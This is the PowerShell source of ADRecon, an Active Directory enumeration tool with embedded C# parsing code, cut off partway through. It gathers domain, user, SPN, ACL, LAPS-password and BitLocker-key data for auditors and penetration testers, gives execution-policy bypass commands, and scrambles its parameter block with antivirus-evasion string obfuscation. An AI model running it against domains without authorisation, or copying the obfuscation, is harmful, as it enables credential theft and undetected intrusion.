<#

.SYNOPSIS

    ADRecon is a tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment.

.DESCRIPTION

    ADRecon is a tool which extracts and combines various artefacts (as highlighted below) out of an AD environment. The information can be presented in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis and provide a holistic picture of the current state of the target AD environment.
    The tool is useful to various classes of security professionals like auditors, DFIR, students, administrators, etc. It can also be an invaluable post-exploitation tool for a penetration tester.
    It can be run from any workstation that is connected to the environment, even hosts that are not domain members. Furthermore, the tool can be executed in the context of a non-privileged (i.e. standard domain user) account.
    Fine Grained Password Policy, LAPS and BitLocker may require Privileged user accounts.
    The tool will use Microsoft Remote Server Administration Tools (RSAT) if available, otherwise it will communicate with the Domain Controller using LDAP.
    The following information is gathered by the tool:
    * Forest;
    * Domain;
    * Trusts;
    * Sites;
    * Subnets;
    * Schema History;
    * Default and Fine Grained Password Policy (if implemented);
    * Domain Controllers, SMB versions, whether SMB Signing is supported and FSMO roles;
    * Users and their attributes;
    * Service Principal Names (SPNs);
    * Groups, memberships and changes;
    * Organizational Units (OUs);
    * GroupPolicy objects and gPLink details;
    * DNS Zones and Records;
    * Printers;
    * Computers and their attributes;
    * PasswordAttributes (Experimental);
    * LAPS passwords (if implemented);
    * BitLocker Recovery Keys (if implemented);
    * ACLs (DACLs and SACLs) for the Domain, OUs, Root Containers, GPO, Users, Computers and Groups objects (not included in the default collection method);
    * GPOReport (requires RSAT);
    * Kerberoast (not included in the default collection method); and
    * Domain accounts used for service accounts (requires privileged account and not included in the default collection method).

    Author     : Prashant Mahajan

.NOTES

    The following commands can be used to turn off ExecutionPolicy: (Requires Admin Privs)

    PS > $ExecPolicy = Get-ExecutionPolicy
    PS > Set-ExecutionPolicy bypass
    PS > .\ADRecon.ps1
    PS > Set-ExecutionPolicy $ExecPolicy

    OR

    Start the PowerShell as follows:
    powershell.exe -ep bypass

    OR

    Already have a PowerShell open ?
    PS > $Env:PSExecutionPolicyPreference = 'Bypass'

    OR

    powershell.exe -nologo -executionpolicy bypass -noprofile -file ADRecon.ps1

.PARAMETER Method
	Which method to use; ADWS (default), LDAP

.PARAMETER DomainController
	Domain Controller IP Address or Domain FQDN.

.PARAMETER Credential
	Domain Credentials.

.PARAMETER GenExcel
	Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.

.PARAMETER OutputDir
	Path for ADRecon output folder to save the files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesn't exist)

.PARAMETER Collect
    Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast, DomainAccountsusedforServiceLogon)
    Valid values include: Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, GPOs, gPLinks, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER OutputType
    Output Type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel).
    Valid values include: STDOUT, CSV, XML, JSON, HTML, Excel, All (excludes STDOUT).

.PARAMETER DormantTimeSpan
    Timespan for Dormant accounts. (Default 90 days)

.PARAMETER PassMaxAge
    Maximum machine account password age. (Default 30 days)

.PARAMETER PageSize
    The PageSize to set for the LDAP searcher object.

.PARAMETER Threads
    The number of threads to use during processing objects. (Default 10)

.PARAMETER Log
    Create ADRecon Log using Start-Transcript

.EXAMPLE

	.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

.EXAMPLE

	.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
	[*] Running on <domain>\<hostname> - Member Workstation
    <snip>

    Example output from Domain Member with Alternate Credentials.

.EXAMPLE

	.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username> -Collect DomainControllers -OutputType Excel
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain Controllers
    [*] Total Execution Time (mins): <minutes>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx
    [*] Completed.
    [*] Output Directory: C:\ADRecon-Report-<timestamp>

    Example output from from a Non-Member using RSAT to only enumerate Domain Controllers.

.EXAMPLE

    .\ADRecon.ps1 -Method ADWS -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] SchemaHistory - May take some time
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users and SPNs - May take some time
    [-] PasswordAttributes - Experimental
    [-] Groups and Membership Changes - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers and SPNs - May take some time
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] GPOReport - May take some time
    WARNING: [*] Run the tool using RUNAS.
    WARNING: [*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:\ADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using RSAT.

.EXAMPLE

    .\ADRecon.ps1 -Method LDAP -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] LDAP bind Successful
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] SchemaHistory - May take some time
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users and SPNs - May take some time
    [-] PasswordAttributes - Experimental
    [-] Groups and Membership Changes - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers and SPNs - May take some time
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] GPOReport - May take some time
    WARNING: [*] Currently, the module is only supported with ADWS.
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:\ADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using LDAP.

.LINK

    https://github.com/adrecon/ADRecon
#>

[CmdletBinding()]
param
(
    [Parameter(Mandatory = $false, HelpMessage = {("{9}{1}{3}{6}{10}{5}{4}{7}{0}{8}{2}" -f't),','hi','LDAP','ch m',' (defa','DWS','et','ul',' ','W','hod to use; A')})]
    [ValidateSet({"{1}{0}" -f'DWS','A'}, {"{0}{1}"-f'L','DAP'})]
    [string] $Method = ("{0}{1}"-f'A','DWS'),

    [Parameter(Mandatory = $false, HelpMessage = {"{4}{5}{0}{1}{3}{7}{2}{6}" -f 'in Controll','er','omain F',' IP Addres','Do','ma','QDN.','s or D'})]
    [string] $DomainController = '',

    [Parameter(Mandatory = $false, HelpMessage = {"{3}{5}{1}{2}{0}{4}"-f'als','n Cred','enti','Doma','.','i'})]
    [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

    [Parameter(Mandatory = $false, HelpMessage = {"{38}{4}{7}{51}{9}{40}{34}{18}{55}{33}{42}{43}{15}{24}{41}{2}{17}{12}{29}{46}{11}{16}{20}{37}{5}{8}{28}{36}{3}{45}{44}{0}{53}{23}{25}{10}{35}{56}{6}{54}{19}{26}{57}{49}{13}{30}{50}{52}{58}{47}{32}{39}{22}{27}{31}{1}{14}{21}{48}" -f'erat','ed to run A',' th','se ','h for A','rt','Recon-Repo','DRecon ','.','tpu','e','e','SV files ','o','D','i','rat','e C','old','x','e the ADRecon-Re','Recon',' ',' ','ni','th',' when Mi','the host u','xls','t','ft Excel','s','l',' ','f',' ','x. U','po','Pat','led on','t ','ng','co','nta','en','it to g','o gen','nsta','.','os',' ','ou','i','e','rt.xls','er','AD','cr','s not i'})]
    [string] $GenExcel,

    [Parameter(Mandatory = $false, HelpMessage = {(("{18}{2}{1}{3}{21}{23}{6}{14}{17}{19}{16}{20}{12}{0}{11}{24}{9}{5}{22}{7}{15}{8}{10}{4}{13}"-f 'n','t','a','h for','if','p','e CSV/X','xlsx.','specified will ','e','be created ','-',' ADReco',' it doesn{0}t exist)','ML/JS',' (The folder ',' and','ON/HTML file','P','s',' the',' ADRecon output folder ','ort.','to save th','R'))  -f[ChaR]39})]
    [string] $OutputDir,

    [Parameter(Mandatory = $false, HelpMessage = {"{91}{31}{36}{85}{50}{9}{56}{64}{22}{59}{49}{83}{109}{94}{17}{5}{73}{105}{6}{62}{71}{70}{52}{115}{10}{100}{27}{96}{33}{34}{55}{48}{104}{45}{93}{76}{92}{40}{25}{57}{19}{75}{78}{112}{99}{43}{14}{21}{41}{89}{7}{44}{95}{35}{51}{32}{101}{103}{18}{87}{3}{80}{67}{107}{53}{63}{65}{26}{47}{60}{102}{111}{12}{114}{66}{86}{42}{0}{24}{46}{13}{8}{39}{77}{110}{106}{69}{88}{4}{1}{68}{90}{74}{72}{16}{98}{20}{29}{37}{28}{113}{79}{82}{54}{58}{81}{15}{23}{2}{38}{97}{108}{61}{84}{30}{11}"-f 'oupM','nte','t','on','i',' and Domai','ount','e',', GPO','; Comma separated; ','orSe','n','Grou','s','cy,','PORepo','ters, ComputerSP','eroast','ain','ub',' L',' ',' Forest,D','rt, Kerberoas','emb','s','tri','Logo','B','AP','Logo',' mod',' ','d val','ues','assw','u','S, ',', DomainAccou','s, gPLin','ite','F','r','wordPoli','d','Forest, D','ers, OU','bu','ncl','in (Def','run','ordPolicy,','e','s, UserSPN','cker, AC',' i','e.',', S','Ls, ','oma','te','rServ','s','s, Password','g','At','roupCh','rolle','rs, ','Reco','s','u','pu','n','m','n','usts, ','ks, DNS','ets, Sche','t','t','G','Lo','aul','ice','les to ','anges, G','C','rds, Pr','ineGrain','Co','Which','S','omain, Tr','ept ACLs, Kerb','P','n) Vali','ntsusedf','Ns,','s','rvice','D','s,','om','ude: ','Acc','S','rs, User','o','t all exc','Zones, DN',' ','maHistory, Pas','i','ps, G','df'})]
    [ValidateSet({"{1}{0}" -f'rest','Fo'}, {"{1}{0}"-f'ain','Dom'}, {"{0}{1}"-f 'Tr','usts'}, {"{1}{0}"-f'ites','S'}, {"{1}{0}" -f 'ets','Subn'}, {"{0}{3}{1}{2}" -f'Sch','sto','ry','emaHi'}, {"{1}{0}{4}{2}{3}" -f 'sswor','Pa','l','icy','dPo'}, {"{1}{2}{4}{5}{3}{0}"-f'cy','FineGrainedPa','s','i','swordP','ol'}, {"{0}{3}{4}{2}{1}"-f 'Dom','lers','trol','ai','nCon'}, {"{1}{0}"-f 'sers','U'}, {"{1}{2}{0}" -f 'SPNs','U','ser'}, {"{3}{1}{5}{2}{0}{4}"-f'te','w','dAttribu','Pass','s','or'}, {"{0}{1}"-f 'Grou','ps'}, {"{0}{3}{2}{1}"-f 'Gr','hanges','C','oup'}, {"{2}{1}{3}{0}" -f'rs','roupMemb','G','e'}, 'OUs', {"{1}{0}"-f 's','GPO'}, {"{2}{1}{0}" -f's','Link','gP'}, {"{1}{0}{2}"-f'Zo','DNS','nes'}, {"{0}{1}{2}" -f'D','NS','Records'}, {"{0}{1}{2}"-f 'Printe','r','s'}, {"{0}{1}{2}" -f 'Com','pute','rs'}, {"{0}{1}{2}" -f'Compute','rSPN','s'}, {"{0}{1}"-f 'LAP','S'}, {"{2}{0}{1}" -f 'c','ker','BitLo'}, {"{0}{1}" -f 'AC','Ls'}, {"{2}{1}{0}" -f'rt','epo','GPOR'}, {"{2}{3}{0}{1}" -f'r','oast','Kerb','e'}, {"{1}{4}{7}{8}{3}{6}{0}{5}{2}{9}" -f'Servi','D','Lo','fo','omai','ce','r','nAccoun','tsused','gon'}, {"{2}{1}{0}" -f't','ul','Defa'})]
    [array] $Collect = ("{0}{2}{1}"-f'Defa','lt','u'),

    [Parameter(Mandatory = $false, HelpMessage = {"{9}{1}{26}{11}{3}{0}{10}{24}{23}{20}{15}{6}{18}{21}{2}{8}{12}{4}{16}{25}{5}{22}{7}{13}{14}{17}{19}" -f 'erated','u','L,',' Comma sep','t ST',' ','O','rameter, ','Excel (Defau','O','; e','pe;','l','else C','SV','JS','DOUT wit',' and Excel','N,',')','XML,','HTM','-Collect pa','OUT,CSV,','.g STD','h','tput ty'})]
    [ValidateSet({"{0}{1}" -f'STDO','UT'}, 'CSV', 'XML', {"{0}{1}" -f 'JSO','N'}, {"{0}{1}"-f'E','XCEL'}, {"{1}{0}" -f'TML','H'}, 'All', {"{2}{0}{1}" -f 'ul','t','Defa'})]
    [array] $OutputType = {"{0}{1}" -f'Defa','ult'},

    [Parameter(Mandatory = $false, HelpMessage = {"{0}{6}{3}{7}{4}{5}{1}{8}{9}{2}{12}{11}{10}"-f 'T',' ac','ts. Def','pan f','rman','t','imes','or Do','co','un',' days',' 90','ault'})]
    [ValidateRange(1,1000)]
    [int] $DormantTimeSpan = 90,

    [Parameter(Mandatory = $false, HelpMessage = {"{0}{10}{9}{12}{1}{7}{11}{3}{2}{5}{6}{4}{8}" -f 'Max','t ',' age. Def','word','0 da','a','ult 3','p','ys','um machine acco','im','ass','un'})]
    [ValidateRange(1,1000)]
    [int] $PassMaxAge = 30,

    [Parameter(Mandatory = $false, HelpMessage = {"{0}{5}{17}{13}{6}{18}{11}{4}{9}{14}{12}{1}{3}{8}{15}{7}{2}{16}{10}"-f 'T',' ',' ','LD','t f','h','iz','archer object.','AP s','or ','ault 200','to se','e','ageS','th','e','Def','e P','e '})]
    [ValidateRange(1,10000)]
    [int] $PageSize = 200,

    [Parameter(Mandatory = $false, HelpMessage = {"{1}{8}{2}{6}{4}{7}{10}{3}{0}{12}{5}{11}{9}"-f 'ocess','The','umber o','pr','e du','ng of objects. Def','f threads to us','r',' n','ult 10','ing ','a','i'})]
    [ValidateRange(1,100)]
    [int] $Threads = 10,

    [Parameter(Mandatory = $false, HelpMessage = {"{5}{6}{3}{2}{4}{0}{1}" -f'scr','ipt','-','t','Tran','Create ADRecon Log us','ing Star'})]
    [switch] $Log
)

$ADWSSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members["OperatingSystem"].Value != null ? AdDC.Members["OperatingSystem"].Value : "-") + " " + AdDC.Members["OperatingSystemHotfix"].Value + " " + AdDC.Members["OperatingSystemServicePack"].Value + " " + AdDC.Members["OperatingSystemVersion"].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members["OperationMasterRoles"].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case "InfrastructureMaster":
                            Infra = true;
                            break;
                            case "DomainNamingMaster":
                            Naming = true;
                            break;
                            case "SchemaMaster":
                            Schema = true;
                            break;
                            case "RIDMaster":
                            RID = true;
                            break;
                            case "PDCEmulator":
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", AdDC.Members["Domain"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Site", AdDC.Members["Site"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Name", AdDC.Members["Name"].Value));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.Members["IPv4Address"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Members["HostName"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.Members["IPv4Address"].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members["IPv4Address"].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Members["ObjectClass"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Members["Name"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Members["whenCreated"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Members["whenChanged"].Value));
